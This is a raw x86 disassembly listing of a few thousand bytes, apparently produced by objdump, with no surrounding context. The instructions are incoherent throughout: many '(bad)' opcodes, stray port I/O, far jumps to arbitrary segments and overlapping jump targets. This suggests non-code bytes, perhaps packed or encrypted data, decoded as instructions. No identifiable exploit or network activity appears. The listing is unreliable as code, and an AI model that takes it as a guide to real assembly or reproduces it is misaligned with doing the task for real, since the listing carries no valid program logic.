  41e662:	xor    al,0xe5
  41e664:	jg     0x41e63f
  41e666:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e667:	scas   eax,DWORD PTR es:[edi]
  41e668:	inc    eax
  41e669:	and    eax,0x57e93b9e
  41e66e:	push   edx
  41e66f:	fidivr DWORD PTR [edx+ecx*1+0x59]
  41e673:	test   eax,0xc5c453cf
  41e678:	jnp    0x41e662
  41e67a:	jge    0x41e660
  41e67c:	scas   eax,DWORD PTR es:[edi]
  41e67d:	loopne 0x41e62b
  41e67f:	dec    ebp
  41e680:	ret    
  41e681:	add    DWORD PTR ds:0xfa6dbca1,edx
  41e687:	dec    esp
  41e688:	jo     0x41e6f0
  41e68a:	xor    DWORD PTR [ebp+esi*8-0x29],ebp
  41e68e:	pop    edx
  41e68f:	dec    edi
  41e690:	or     dl,BYTE PTR [ecx]
  41e692:	cwde   
  41e693:	lock ja 0x41e6ee
  41e696:	mov    edi,0xd4fbead5
  41e69b:	das    
  41e69c:	mov    dl,BYTE PTR [esi]
  41e69e:	pop    ebx
  41e69f:	adc    DWORD PTR [esi],edx
  41e6a1:	sub    esi,DWORD PTR [ebx-0x2]
  41e6a4:	nop
  41e6a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e6a6:	bound  eax,QWORD PTR [eax+0x49]
  41e6a9:	push   ebx
  41e6aa:	mov    ds:0xd1d13e07,eax
  41e6af:	sub    DWORD PTR [ebx],eax
  41e6b1:	repz add BYTE PTR [edi-0x4cd6f4a0],bl
  41e6b8:	jg     0x41e674
  41e6ba:	shl    BYTE PTR [eax],1
  41e6bc:	xor    eax,0x132890d9
  41e6c1:	push   0x464ffd58
  41e6c6:	inc    ebx
  41e6c7:	jmp    0x41e669
  41e6c9:	xchg   ebx,eax
  41e6ca:	push   edx
  41e6cb:	data16 mov bl,bh
  41e6ce:	in     eax,dx
  41e6cf:	fs mov bh,0xe8
  41e6d2:	and    DWORD PTR [ebp+0x3b25b40f],ebx
  41e6d8:	pusha  
  41e6d9:	adc    BYTE PTR [ebp+0x18756c63],al
  41e6df:	ins    BYTE PTR es:[edi],dx
  41e6e0:	sbb    DWORD PTR [edi-0xa],esi
  41e6e3:	jo     0x41e6cd
  41e6e5:	push   es
  41e6e6:	push   0x5
  41e6e8:	xor    al,0x57
  41e6ea:	setno  BYTE PTR [ebx]
  41e6ed:	daa    
  41e6ee:	retf   0xc796
  41e6f1:	(bad)  
  41e6f2:	loope  0x41e741
  41e6f4:	sub    cl,BYTE PTR [edx-0x2e]
  41e6f7:	jmp    0xf8e0:0xc2ab5f4b
  41e6fe:	popa   
  41e6ff:	dec    edi
  41e700:	mov    al,ds:0x9fd4d9a3
  41e705:	sbb    ah,BYTE PTR [ebp-0x7c]
  41e708:	cmp    eax,0x6a702266
  41e70d:	ins    BYTE PTR es:[edi],dx
  41e70e:	cli    
  41e70f:	inc    ebp
  41e710:	or     ebx,DWORD PTR ds:0x7d3322b9
  41e716:	xchg   edx,eax
  41e717:	loopne 0x41e721
  41e719:	lahf   
  41e71a:	aaa    
  41e71b:	imul   ebp,DWORD PTR [ebx-0x3],0x2e1c8a15
  41e722:	les    ecx,FWORD PTR [eax]
  41e724:	(bad)  
  41e726:	fwait
  41e727:	int    0xfd
  41e729:	mov    BYTE PTR [ecx+0x3dae4853],0x7b
  41e730:	add    BYTE PTR [ebp+0x5466d125],al
  41e736:	xor    bh,BYTE PTR [eax+0x1383b41d]
  41e73c:	inc    edx
  41e73d:	dec    eax
  41e73e:	loopne 0x41e778
  41e740:	sub    eax,0xc30a0f9e
  41e745:	inc    esp
  41e746:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e747:	pop    ss
  41e748:	jae    0x41e7bc
  41e74a:	sbb    ah,cl
  41e74c:	not    BYTE PTR ds:0x74db462b
  41e752:	es mov bh,0x1
  41e755:	jbe    0x41e7c6
  41e757:	xor    dh,BYTE PTR [edi-0x3203979f]
  41e75d:	lock sub DWORD PTR [ecx-0x2b],ebp
  41e761:	inc    eax
  41e762:	test   BYTE PTR [edx],bl
  41e764:	mov    dh,0x79
  41e766:	adc    ch,BYTE PTR [ebx-0x2f]
  41e769:	lahf   
  41e76a:	popf   
  41e76b:	sbb    BYTE PTR [edi],dl
  41e76d:	aad    0x10
  41e76f:	retf   0x6acb
  41e772:	adc    al,0xa9
  41e774:	loop   0x41e746
  41e776:	and    BYTE PTR [esi-0x21f547bb],ch
  41e77c:	push   esp
  41e77d:	dec    ecx
  41e77e:	arpl   WORD PTR [esp+ebp*1],di
  41e781:	dec    edi
  41e782:	lea    ebp,[ebx+0x7dcffd31]
  41e788:	sti    
  41e789:	or     DWORD PTR fs:0xdd5eb8e5,edx
  41e790:	mov    al,ds:0xf166282
  41e795:	sahf   
  41e796:	lahf   
  41e797:	lods   al,BYTE PTR ds:[esi]
  41e798:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e799:	fldcw  WORD PTR [ebx-0x24]
  41e79c:	or     eax,DWORD PTR [ebp+0x34]
  41e79f:	xor    eax,0xdf3e3976
  41e7a4:	mov    eax,0xf7b188c0
  41e7a9:	xchg   edi,eax
  41e7aa:	jns    0x41e731
  41e7ac:	mov    bl,0xaa
  41e7ae:	inc    ebp
  41e7af:	sub    edx,DWORD PTR ds:0x33e5bccb
  41e7b5:	inc    ecx
  41e7b6:	jle    0x41e802
  41e7b8:	jle    0x41e806
  41e7ba:	in     al,0x1
  41e7bc:	mov    ebx,0x8d0ff36f
  41e7c1:	rol    DWORD PTR [esi+edx*8+0x24eafa2a],0x33
  41e7c9:	into   
  41e7ca:	rcr    DWORD PTR [eax-0x645491a1],0xe1
  41e7d1:	jmp    0x41e83a
  41e7d3:	mov    eax,0xea20763
  41e7d8:	div    BYTE PTR [esi+ecx*2+0x74]
  41e7dc:	sub    al,0x3d
  41e7de:	outs   dx,DWORD PTR ds:[esi]
  41e7df:	dec    DWORD PTR ds:0xb04c55ee
  41e7e5:	stos   BYTE PTR es:[edi],al
  41e7e6:	mov    ecx,0x69810d92
  41e7eb:	into   
  41e7ec:	add    edx,DWORD PTR [esi-0x3a]
  41e7ef:	mov    DWORD PTR [edx+eax*2+0x1e0a0eea],eax
  41e7f6:	lea    ebp,[edx-0x2c380c70]
  41e7fc:	shl    DWORD PTR [ebp+edi*8-0x51],cl
  41e800:	(bad)  
  41e802:	mov    dh,0x80
  41e804:	xchg   ecx,eax
  41e805:	retf   0x23e4
  41e808:	dec    ebx
  41e809:	lods   al,BYTE PTR ds:[esi]
  41e80a:	sub    bl,BYTE PTR [edi]
  41e80c:	and    DWORD PTR [edi],ecx
  41e80e:	fnstenv [esi-0x4e]
  41e811:	mov    dh,0x30
  41e813:	push   es
  41e814:	mov    esp,0xd0a6592a
  41e819:	and    DWORD PTR [ebx+0x1c],0x10
  41e81d:	stos   BYTE PTR es:[edi],al
  41e81e:	pop    edx
  41e81f:	dec    ebp
  41e820:	jo     0x41e843
  41e822:	not    DWORD PTR [eax+0x67f0216c]
  41e828:	sub    DWORD PTR ds:0xd6f95d77,ebp
  41e82e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e82f:	cmp    esp,DWORD PTR [ecx]
  41e831:	stos   BYTE PTR es:[edi],al
  41e832:	mov    eax,ds:0x15cdec9
  41e837:	cld    
  41e838:	outs   dx,BYTE PTR ds:[esi]
  41e839:	(bad)  
  41e83a:	es inc esp
  41e83c:	(bad)  
  41e83d:	jecxz  0x41e806
  41e83f:	mov    cl,0xa7
  41e841:	lock push es
  41e843:	xor    eax,0xe7d0fb4c
  41e848:	sub    bh,BYTE PTR [ecx]
  41e84a:	leave  
  41e84b:	sub    eax,0xffec509c
  41e850:	jecxz  0x41e86f
  41e852:	dec    eax
  41e853:	dec    ecx
  41e854:	les    edi,FWORD PTR ds:0xee362991
  41e85a:	cli    
  41e85b:	cmp    dh,ah
  41e85d:	(bad)  
  41e85f:	inc    ecx
  41e860:	jge    0x41e88d
  41e862:	inc    edx
  41e863:	or     DWORD PTR ds:0x6c40d91f,edx
  41e869:	sbb    eax,0x2317cfa9
  41e86e:	mov    ds:0x66b135cb,al
  41e873:	ror    esp,0xf7
  41e876:	push   esi
  41e877:	or     ecx,eax
  41e879:	mov    ss,WORD PTR [esp+eiz*4]
  41e87c:	fistp  WORD PTR [ebx-0x79]
  41e87f:	mov    ?,WORD PTR [ecx+eax*2+0x75]
  41e883:	cmp    ebp,DWORD PTR ss:[ebx]
  41e886:	adc    BYTE PTR [ebx-0x14ca14d1],dl
  41e88c:	loope  0x41e84a
  41e88e:	js     0x41e89a
  41e890:	ins    DWORD PTR es:[edi],dx
  41e891:	or     al,0xbf
  41e893:	(bad)  
  41e894:	dec    esp
  41e895:	cdq    
  41e896:	lock arpl WORD PTR [esp+eax*8],bx
  41e89a:	mov    DWORD PTR [edx+0x43],ecx
  41e89d:	retf   0x7750
  41e8a0:	repnz (bad) 
  41e8a2:	in     eax,0xbd
  41e8a4:	cli    
  41e8a5:	push   0x41
  41e8a7:	imul   ebp,ebp,0x3c
  41e8aa:	hlt    
  41e8ab:	sti    
  41e8ac:	bound  esi,QWORD PTR [ebp-0x3f]
  41e8af:	fcmovbe st,st(2)
  41e8b1:	add    al,ah
  41e8b3:	in     eax,0x1e
  41e8b5:	call   0x2df1:0xada769b7
  41e8bc:	ds ret 0x63ea
  41e8c0:	sar    BYTE PTR [edx+0x25],cl
  41e8c3:	test   DWORD PTR [ebp+0x2f],edi
  41e8c6:	mov    edx,0x86031146
  41e8cb:	mov    eax,ds:0x43ed2678
  41e8d0:	mov    esi,DWORD PTR [edi-0x5d]
  41e8d3:	stos   DWORD PTR es:[edi],eax
  41e8d4:	cli    
  41e8d5:	xchg   ebx,eax
  41e8d6:	fst    DWORD PTR [esi-0xda3e4cd]
  41e8dc:	(bad)  
  41e8de:	xchg   ebx,eax
  41e8df:	ret    
  41e8e0:	test   BYTE PTR [ebx],bl
  41e8e2:	aas    
  41e8e3:	imul   ecx,DWORD PTR [eax-0x7f2b3fc],0xfffffff5
  41e8ea:	mov    dl,0x1e
  41e8ec:	inc    ecx
  41e8ed:	clc    
  41e8ee:	popf   
  41e8ef:	push   ecx
  41e8f0:	sti    
  41e8f1:	sub    al,0x82
  41e8f3:	jb     0x41e8a9
  41e8f5:	mov    edi,0x78910a54
  41e8fa:	stc    
  41e8fb:	cmp    BYTE PTR [edx],bl
  41e8fd:	jno    0x41e97a
  41e8ff:	adc    al,0x69
  41e901:	je     0x41e8b3
  41e903:	cli    
  41e904:	call   0xa773:0x46e5dc39
  41e90b:	into   
  41e90c:	call   0x8d918878
  41e911:	add    DWORD PTR [eax+0x57],esp
  41e914:	fbld   TBYTE PTR [ebx-0x4f]
  41e917:	outs   dx,DWORD PTR ds:[esi]
  41e918:	push   esp
  41e919:	push   esi
  41e91a:	out    0xfa,al
  41e91c:	test   BYTE PTR [ecx-0x1c],0xe3
  41e920:	xchg   edx,eax
  41e921:	pop    esp
  41e922:	push   edi
  41e923:	lods   eax,DWORD PTR ds:[esi]
  41e924:	out    0x69,eax
  41e926:	retf   0xd760
  41e929:	retf   0x18fd
  41e92c:	shl    al,0x90
  41e92f:	or     BYTE PTR [edx-0x66f4a807],bh
  41e935:	arpl   WORD PTR [ebp-0x26bb8f66],cx
  41e93b:	addr16 (bad) 
  41e93d:	out    0x3,eax
  41e93f:	leave  
  41e940:	out    dx,eax
  41e941:	sub    ecx,DWORD PTR [ecx]
  41e943:	mov    ebx,0x4a631dcf
  41e948:	adc    BYTE PTR [esi],cl
  41e94a:	xlat   BYTE PTR ds:[ebx]
  41e94b:	jmp    0x41e9c2
  41e94d:	inc    eax
  41e94e:	test   al,0x40
  41e950:	and    DWORD PTR [edi*8-0x78d2a7a3],edi
  41e957:	les    ecx,FWORD PTR [ecx]
  41e959:	add    ebp,0x2c
  41e95c:	in     al,0xa1
  41e95e:	in     eax,0x53
  41e960:	fwait
  41e961:	aaa    
  41e962:	dec    esp
  41e963:	jp     0x41e99a
  41e965:	mov    ?,WORD PTR [edi+0x2d93b343]
  41e96b:	push   ss
  41e96c:	clc    
  41e96d:	pop    ebp
  41e96e:	or     al,0x3b
  41e970:	pop    ss
  41e971:	adc    al,0x8a
  41e973:	or     BYTE PTR [eax+edi*4],ah
  41e976:	inc    ebp
  41e977:	pop    ebx
  41e978:	das    
  41e979:	enter  0xb1c0,0x34
  41e97d:	sub    BYTE PTR [ecx],dh
  41e97f:	imul   ebp,ebx,0x15
  41e982:	repnz dec ecx
  41e984:	(bad)  
  41e985:	cmp    dh,bh
  41e987:	leave  
  41e988:	inc    ecx
  41e989:	pop    ebx
  41e98a:	pop    ecx
  41e98b:	push   ss
  41e98c:	test   WORD PTR [edi+0x3ba7391b],0xc3b
  41e995:	enter  0x185e,0xb5
  41e999:	mov    BYTE PTR [ebx+0x5e],cl
  41e99c:	or     eax,0x827da3ad
  41e9a1:	jne    0x41e97d
  41e9a3:	idiv   BYTE PTR [edx+edx*8-0x2f]
  41e9a7:	rcr    BYTE PTR [edx],cl
  41e9a9:	push   esi
  41e9aa:	call   esp
  41e9ac:	mov    cl,0x68
  41e9ae:	mov    al,ds:0x6d162a5f
  41e9b3:	or     esi,esi
  41e9b5:	jle    0x41e9a9
  41e9b7:	jae    0x41e982
  41e9b9:	jmp    0x2890:0x2af98f8b
  41e9c0:	mov    ch,0xad
  41e9c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e9c3:	add    eax,0x301b033
  41e9c8:	xor    BYTE PTR [eax+0x432fdcae],ah
  41e9ce:	popf   
  41e9cf:	in     eax,dx
  41e9d0:	and    eax,0x5a925a2d
  41e9d5:	xor    al,0x74
  41e9d7:	push   ds
  41e9d8:	cmc    
  41e9d9:	or     eax,0x40d4078c
  41e9de:	adc    esp,DWORD PTR cs:[ebx+0xd]
  41e9e2:	(bad)  
  41e9e3:	out    0xf2,al
  41e9e5:	ja     0x41e9ef
  41e9e7:	imul   BYTE PTR [eax+esi*2+0x5a2dc682]
  41e9ee:	aam    0x38
  41e9f0:	sbb    al,0x5f
  41e9f2:	xchg   esp,eax
  41e9f3:	dec    edx
  41e9f4:	shl    bl,cl
  41e9f6:	mov    esp,0x81ab2584
  41e9fb:	(bad)  
  41e9fc:	popa   
  41e9fd:	lea    esp,[ebx+0x24af833b]
  41ea03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ea04:	ret    0xcd9
  41ea07:	adc    eax,0xca6a46ef
  41ea0c:	pop    eax
  41ea0d:	es dec ebx
  41ea0f:	push   ss
  41ea10:	not    BYTE PTR [ebp+0x5e]
  41ea13:	mov    es,WORD PTR [esi+0x6330cde2]
  41ea19:	sub    DWORD PTR [ebx],esp
  41ea1b:	and    BYTE PTR [eax+ebp*1+0x1d],dl
  41ea1f:	div    BYTE PTR [edi+0x21]
  41ea22:	push   ds
  41ea23:	(bad)
  41ea26:	push   ds
  41ea27:	sbb    dh,BYTE PTR [edi]
  41ea29:	ret    
  41ea2a:	not    BYTE PTR [edx+eiz*2]
  41ea2d:	test   DWORD PTR [edx+0x4db66ee3],eax
  41ea33:	nop
  41ea34:	retf   
  41ea35:	push   esi
  41ea36:	in     al,dx
  41ea37:	add    al,BYTE PTR [ecx+0x22ee5ed9]
  41ea3d:	cmp    DWORD PTR [ebp-0x30b4e8b8],ebp
  41ea43:	stos   BYTE PTR es:[edi],al
  41ea44:	push   esi
  41ea45:	imul   eax,DWORD PTR ds:0x4b1d0fe4,0xb0a4226e
  41ea4f:	retf   
  41ea50:	add    bh,cl
  41ea52:	icebp  
  41ea53:	sbb    BYTE PTR [esi-0x7f],dl
  41ea56:	lahf   
  41ea57:	scas   al,BYTE PTR es:[edi]
  41ea58:	aam    0x6e
  41ea5a:	mov    eax,ds:0x177c6029
  41ea60:	mov    ebx,DWORD PTR ds:0xe48d0ee0
  41ea66:	pushf  
  41ea67:	ins    DWORD PTR es:[edi],dx
  41ea68:	arpl   si,cx
  41ea6a:	pop    eax
  41ea6b:	mov    esp,0x2726e537
  41ea70:	shr    BYTE PTR [ebp-0x41],cl
  41ea73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea75:	or     al,0x6
  41ea77:	dec    esi
  41ea78:	or     ebp,DWORD PTR [esp+ebx*1-0x1081a008]
  41ea7f:	jmp    0x464d3b42
  41ea84:	lock sub BYTE PTR [ecx+0x39],cl
  41ea88:	out    dx,eax
  41ea89:	inc    ebx
  41ea8a:	stos   DWORD PTR es:[edi],eax
  41ea8b:	inc    ebx
  41ea8c:	into   
  41ea8d:	xor    al,0xdb
  41ea8f:	dec    edi
  41ea90:	clc    
  41ea91:	xor    edi,ecx
  41ea93:	rcr    BYTE PTR [ebx],1
  41ea95:	and    BYTE PTR ds:0x300c30d3,cl
  41ea9b:	dec    eax
  41ea9c:	or     BYTE PTR [edi+ebp*1],ah
  41ea9f:	or     dl,ah
  41eaa1:	add    DWORD PTR ds:0xf5d97c2b,edi
  41eaa7:	sbb    DWORD PTR [ebx+0x7e],ecx
  41eaaa:	push   ss
  41eaab:	cmp    DWORD PTR ds:0x480fdd6c,esi
  41eab1:	jle    0x41ea92
  41eab3:	cmp    DWORD PTR [edx+edi*1],0x27edeaa9
  41eaba:	lea    edx,[esi+0x3]
  41eabd:	lahf   
  41eabe:	pop    esi
  41eabf:	xchg   edx,eax
  41eac0:	ss mov eax,0x4c7d20aa
  41eac6:	add    al,0x64
  41eac8:	icebp  
  41eac9:	pop    edx
  41eaca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eacb:	jmp    0xfcd4:0x62b85422
  41ead2:	fnsave [edi-0x2ed5658e]
  41ead8:	loopne 0x41eae5
  41eada:	pop    edi
  41eadb:	sub    dl,dh
  41eadd:	xchg   esi,eax
  41eade:	push   esp
  41eadf:	mov    ecx,0xfc1668c
  41eae4:	or     DWORD PTR [ecx],edx
  41eae6:	out    dx,eax
  41eae7:	bts    DWORD PTR [eax+0x3616f91f],esp
  41eaee:	cdq    
  41eaef:	cmp    DWORD PTR [eax+eax*8-0x2add9b7a],edx
  41eaf6:	cdq    
  41eaf7:	mov    DWORD PTR [edi-0x9],0xeb18a3c2
  41eafe:	data16 fsub st,st(0)
  41eb01:	dec    ebx
  41eb02:	xor    eax,0x4a69c359
  41eb07:	stos   DWORD PTR es:[edi],eax
  41eb08:	adc    DWORD PTR [edx+0x15fb7220],esp
  41eb0e:	or     dl,BYTE PTR [eax]
  41eb10:	jp     0x41eaee
  41eb12:	div    DWORD PTR [edx-0x2e]
  41eb15:	ins    BYTE PTR es:[edi],dx
  41eb16:	enter  0x1bbc,0xc9
  41eb1a:	xor    bl,BYTE PTR [edi+0x6]
  41eb1d:	pop    ebp
  41eb1e:	test   DWORD PTR [edi+eiz*4+0x52],esi
  41eb22:	imul   ebp,DWORD PTR [ecx+0x393e9d87],0x27a7de39
  41eb2c:	mov    ch,0x66
  41eb2e:	icebp  
  41eb2f:	xchg   esp,eax
  41eb30:	(bad)
  41eb33:	vpaddusw ymm3,ymm3,ymm0
  41eb37:	retf   0x50e2
  41eb3a:	fld    QWORD PTR [esi-0x4b]
  41eb3d:	cmp    al,0xa8
  41eb3f:	jl     0x41eb5d
  41eb41:	cld    
  41eb42:	push   es
  41eb43:	daa    
  41eb44:	out    0x1c,eax
  41eb46:	add    ecx,0x5d
  41eb49:	outs   dx,BYTE PTR ds:[esi]
  41eb4a:	inc    edx
  41eb4b:	cmc    
  41eb4c:	dec    ebp
  41eb4d:	xchg   ebp,eax
  41eb4e:	je     0x41ead2
  41eb50:	clc    
  41eb51:	inc    esp
  41eb52:	daa    
  41eb53:	xor    BYTE PTR [ebx],al
  41eb55:	out    dx,al
  41eb56:	or     al,0x27
  41eb58:	es ds push es
  41eb5b:	xchg   BYTE PTR [ebp-0x34],dh
  41eb5e:	sbb    al,0xf3
  41eb60:	sahf   
  41eb61:	cmp    BYTE PTR [edx+0x14a01e1],bh
  41eb67:	lds    ecx,FWORD PTR [esi-0x32]
  41eb6a:	inc    eax
  41eb6b:	retf   0x3fb2
  41eb6e:	mov    eax,0x2564b011
  41eb73:	or     eax,0x790bb335
  41eb78:	out    dx,al
  41eb79:	dec    eax
  41eb7a:	push   DWORD PTR [edi+0x44708944]
  41eb80:	push   ds
  41eb81:	jno    0x41eb48
  41eb83:	mov    ebp,edx
  41eb85:	daa    
  41eb86:	gs test eax,0x468c1fc9
  41eb8c:	sub    bh,bh
  41eb8e:	retf   0x79d7
  41eb91:	addr16 sbb dh,cl
  41eb94:	fmul   QWORD PTR [eax]
  41eb96:	lods   al,BYTE PTR ds:[esi]
  41eb97:	cmp    eax,0xe5df6114
  41eb9c:	or     DWORD PTR [esi],eax
  41eb9e:	out    dx,eax
  41eb9f:	call   0x8e33e313
  41eba4:	mov    bh,0xcb
  41eba6:	daa    
  41eba7:	add    ecx,edx
  41eba9:	mov    ds:0x72ae456d,al
  41ebae:	shl    cl,0x23
  41ebb1:	pop    ebp
  41ebb2:	cmp    eax,0x77287a65
  41ebb7:	pop    ecx
  41ebb8:	bound  edx,QWORD PTR [ebx+0x53]
  41ebbb:	push   ebx
  41ebbc:	adc    ebp,DWORD PTR fs:[ebx]
  41ebbf:	cld    
  41ebc0:	and    DWORD PTR [ebx-0x7189e326],esp
  41ebc6:	icebp  
  41ebc7:	and    BYTE PTR [esi],al
  41ebc9:	or     eax,0xd2bb24e3
  41ebce:	sbb    al,BYTE PTR [ebp-0x36]
  41ebd1:	(bad)  
  41ebd2:	or     ebx,DWORD PTR [eax+0x0]
  41ebd5:	mov    ecx,ebp
  41ebd7:	ins    DWORD PTR es:[edi],dx
  41ebd8:	scas   al,BYTE PTR es:[edi]
  41ebd9:	add    eax,0x600c725
  41ebde:	repnz aam 0xe8
  41ebe1:	sbb    eax,0xfd732c07
  41ebe6:	mov    dl,0x7a
  41ebe8:	or     DWORD PTR [ebp+0x62a22d69],esp
  41ebee:	aad    0x45
  41ebf0:	inc    ecx
  41ebf1:	mov    al,0x1f
  41ebf3:	aaa    
  41ebf4:	rcl    edi,1
  41ebf6:	pop    eax
  41ebf7:	test   edi,ebx
  41ebf9:	inc    ebp
  41ebfa:	ffree  st(7)
  41ebfc:	data16 bnd jp 0x41ebc1
  41ec00:	add    DWORD PTR [ebx+ecx*8+0x4fc85890],edx
  41ec07:	and    al,0x4
  41ec09:	imul   edx,DWORD PTR [edx+eiz*4+0x4a241c2b],0x480385fc
  41ec14:	clc    
  41ec15:	lods   al,BYTE PTR ds:[esi]
  41ec16:	cmp    ebx,DWORD PTR [esi]
  41ec18:	pusha  
  41ec19:	add    al,0x26
  41ec1b:	jecxz  0x41ec33
  41ec1d:	xor    dl,BYTE PTR [edx+0x7e]
  41ec20:	sub    cl,dl
  41ec22:	stc    
  41ec23:	push   cs
  41ec24:	fwait
  41ec25:	mov    ebp,ecx
  41ec27:	jo     0x41ec9c
  41ec29:	sbb    ecx,0x1
  41ec2c:	mov    ch,0x53
  41ec2e:	sbb    eax,0xd84c6401
  41ec33:	into   
  41ec34:	clc    
  41ec35:	add    DWORD PTR [ebx],0x9a6d88d2
  41ec3b:	or     al,0x4
  41ec3d:	shr    BYTE PTR [edi-0x3b],cl
  41ec40:	enter  0xd079,0xd9
  41ec44:	push   eax
  41ec45:	retf   
  41ec46:	mov    WORD PTR [ecx-0x737ad118],?
  41ec4c:	loope  0x41ec51
  41ec4e:	xor    DWORD PTR [eax],edx
  41ec50:	push   esi
  41ec51:	cmp    ebp,DWORD PTR [ebp-0x282f835b]
  41ec57:	adc    ch,BYTE PTR [eax-0x1c]
  41ec5a:	pop    ds
  41ec5b:	js     0x41ebf1
  41ec5d:	mov    ds:0xa252c6db,al
  41ec62:	cmc    
  41ec63:	push   cs
  41ec64:	push   DWORD PTR [eax-0x4d]
  41ec67:	push   esi
  41ec68:	stc    
  41ec69:	jp     0x41ec48
  41ec6b:	mov    edi,0x641be074
  41ec70:	xor    esp,esp
  41ec72:	ret    
  41ec73:	retf   
  41ec74:	add    ebx,DWORD PTR [eax-0x235403f9]
  41ec7a:	std    
  41ec7b:	jno    0x41eca3
  41ec7d:	pop    edi
  41ec7f:	dec    eax
  41ec80:	sub    DWORD PTR [edi-0xd],0xffffffe2
  41ec84:	cwde   
  41ec85:	sbb    dh,BYTE PTR [edi]
  41ec87:	cld    
  41ec88:	loope  0x41ecb9
  41ec8a:	pop    ds
  41ec8b:	das    
  41ec8c:	das    
  41ec8d:	or     al,0x61
  41ec8f:	or     eax,0x4cce419c
  41ec94:	dec    ebx
  41ec95:	int    0x66
  41ec97:	data16 data16 cld 
  41ec9a:	inc    edi
  41ec9b:	add    eax,0xe1bceaa7
  41eca0:	jp     0x41ec51
  41eca2:	push   edx
  41eca3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eca4:	mov    ch,0x7e
  41eca6:	xor    al,0xf1
  41eca8:	cmc    
  41eca9:	xor    ebp,DWORD PTR ds:0x9955512c
  41ecaf:	rcl    BYTE PTR [edx],0xec
  41ecb2:	xchg   cl,bh
  41ecb4:	ror    DWORD PTR [edx],1
  41ecb6:	dec    edi
  41ecb7:	ins    DWORD PTR es:[edi],dx
  41ecb8:	stc    
  41ecb9:	dec    esi
  41ecba:	ins    DWORD PTR es:[edi],dx
  41ecbb:	out    dx,al
  41ecbc:	pop    es
  41ecbd:	(bad)  
  41ecbf:	mov    al,ds:0xa4cca71a
  41ecc4:	pop    es
  41ecc5:	or     BYTE PTR [eax],0x56
  41ecc8:	out    dx,al
  41ecc9:	shl    edx,0x36
  41eccc:	daa    
  41eccd:	sahf   
  41ecce:	sbb    al,0x9
  41ecd0:	push   0xffffff80
  41ecd2:	jp     0x41ec5e
  41ecd4:	dec    edi
  41ecd5:	push   ebx
  41ecd6:	inc    esp
  41ecd7:	sbb    esi,DWORD PTR [ebp-0x29]
  41ecda:	sub    DWORD PTR [ebp+0x6f],0xffffff93
  41ecde:	cmp    al,0xc9
  41ece0:	dec    edi
  41ece1:	stos   BYTE PTR es:[edi],al
  41ece2:	int3   
  41ece3:	outs   dx,DWORD PTR ds:[esi]
  41ece4:	bound  ecx,QWORD PTR [esi+0x56c51611]
  41ecea:	mov    bh,bh
  41ecec:	xchg   ebp,eax
  41eced:	pop    ds
  41ecee:	xor    ch,ah
  41ecf0:	sbb    eax,0x1c049c2e
  41ecf5:	ret    0xc76
  41ecf8:	and    BYTE PTR [bp+di],bl
  41ecfb:	inc    edx
  41ecfc:	sbb    eax,esp
  41ecfe:	mov    ch,0x66
  41ed00:	imul   edi,DWORD PTR [ebp+0x56],0xacca2884
  41ed07:	(bad)  
  41ed08:	in     al,dx
  41ed09:	sub    eax,0x2069c257
  41ed0e:	and    al,0x74
  41ed10:	jmp    0xa92f:0x34d51d22
  41ed17:	frndint 
  41ed19:	inc    eax
  41ed1a:	sar    BYTE PTR [ebx*8+0x4c94c6f8],cl
  41ed21:	hlt    
  41ed22:	gs inc esi
  41ed24:	cli    
  41ed25:	and    DWORD PTR [esi],ebx
  41ed27:	js     0x41eda5
  41ed29:	fcomp  DWORD PTR [eax]
  41ed2b:	hlt    
  41ed2c:	xchg   esi,eax
  41ed2d:	shl    ah,1
  41ed2f:	in     eax,0x5a
  41ed31:	push   es
  41ed32:	fstp   TBYTE PTR [ecx+ebp*2+0x58704ed5]
  41ed39:	pop    ecx
  41ed3a:	inc    esp
  41ed3b:	sbb    al,0x90
  41ed3d:	arpl   WORD PTR [esp+esi*4-0x42],ax
  41ed41:	sub    DWORD PTR [eax+0x20],esp
  41ed44:	inc    ebp
  41ed45:	xor    al,0xe5
  41ed47:	inc    ecx
  41ed48:	call   0xbc646aab
  41ed4d:	adc    edi,esp
  41ed4f:	icebp  
  41ed50:	call   0xc63d:0x38a8c726
  41ed57:	mov    al,0x2d
  41ed59:	push   edi
  41ed5a:	and    DWORD PTR [ebp-0x46],esi
  41ed5d:	aam    0x6d
  41ed5f:	mov    ebp,0x98a4c7dc
  41ed64:	dec    edi
  41ed65:	mov    ebp,0x1d3dbbe1
  41ed6a:	out    0x87,eax
  41ed6c:	xchg   BYTE PTR ds:0xdc608455,bh
  41ed72:	in     al,0x46
  41ed74:	mov    edi,ebx
  41ed76:	lahf   
  41ed77:	jmp    DWORD PTR [ebx]
  41ed79:	inc    edi
  41ed7a:	sar    eax,1
  41ed7c:	scas   eax,DWORD PTR es:[edi]
  41ed7d:	and    DWORD PTR ds:0x40186486,edi
  41ed83:	aam    0xb2
  41ed85:	out    dx,eax
  41ed86:	retf   
  41ed87:	into   
  41ed88:	dec    edi
  41ed89:	dec    edi
  41ed8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ed8b:	jl     0x41edb1
  41ed8d:	inc    ecx
  41ed8e:	in     eax,0xad
  41ed90:	mov    al,0xc0
  41ed92:	not    BYTE PTR [edx]
  41ed94:	stc    
  41ed95:	jge    0x41edff
  41ed97:	(bad)  
  41ed98:	mov    ebx,0xe4ce968e
  41ed9d:	repz cli 
  41ed9f:	or     al,0xd8
  41eda1:	mov    bh,0x3b
  41eda3:	push   0x1c
  41eda5:	mov    ds,WORD PTR [edi-0x3e8d2bb3]
  41edab:	mov    al,0xa
  41edad:	fnstcw WORD PTR [ecx]
  41edaf:	mov    bh,0xa0
  41edb1:	test   edi,0xce0f522c
  41edb7:	inc    esp
  41edb8:	jne    0x41ee36
  41edba:	ja     0x41ee36
  41edbc:	xor    bh,dl
  41edbe:	dec    ebx
  41edbf:	lds    edi,FWORD PTR ds:0xb523ed47
  41edc5:	xor    eax,0x2f423f74
  41edca:	push   esp
  41edcb:	jnp    0x41ed78
  41edcd:	loop   0x41edee
